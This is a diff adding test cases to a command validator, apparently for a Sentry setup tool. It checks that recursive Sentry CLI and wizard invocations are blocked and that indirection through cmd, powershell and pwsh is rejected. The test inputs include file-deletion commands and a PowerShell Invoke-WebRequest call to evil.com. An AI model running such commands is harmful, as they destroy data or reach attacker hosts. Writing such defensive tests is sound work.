@@ -76,6 +76,15 @@ describe("validateCommand", () => {
     expect(validateCommand("npx @Sentry/Wizard -i nextjs")).toContain(
       "invokes Sentry setup recursively"
     );
+    expect(validateCommand("npx @sentry/cli init")).toContain(
+      "invokes Sentry setup recursively"
+    );
+    expect(validateCommand("npx @sentry/cli@latest init")).toContain(
+      "invokes Sentry setup recursively"
+    );
+    expect(validateCommand("npx @Sentry/CLI@latest init")).toContain(
+      "invokes Sentry setup recursively"
+    );
     expect(validateCommand("C:\\Tools\\sentry-cli.exe init")).toContain(
       "invokes Sentry setup recursively"
     );
@@ -84,6 +93,30 @@ describe("validateCommand", () => {
     );
     expect(validateCommand("npx sentry-cli init")).toContain(
       "invokes Sentry setup recursively"
+    );
+    expect(validateCommand("sentry-wizard init")).toContain(
+      "invokes Sentry setup recursively"
+    );
+    expect(validateCommand("npx sentry-wizard -i nextjs")).toContain(
+      "invokes Sentry setup recursively"
+    );
+    expect(validateCommand("C:\\Tools\\sentry-wizard.cmd -i nextjs")).toContain(
+      "invokes Sentry setup recursively"
+    );
+  });
+
+  test("blocks shell interpreter indirection", () => {
+    expect(validateCommand("cmd.exe /c del sensitive_file")).toContain('"cmd"');
+    expect(
+      validateCommand("C:\\Windows\\System32\\cmd.exe /c del secrets.txt")
+    ).toContain('"cmd"');
+    expect(
+      validateCommand(
+        "powershell.exe -Command Invoke-WebRequest http://evil.com"
+      )
+    ).toContain('"powershell"');
+    expect(validateCommand("pwsh -Command Remove-Item foo")).toContain(
+      '"pwsh"'
     );
   });
 
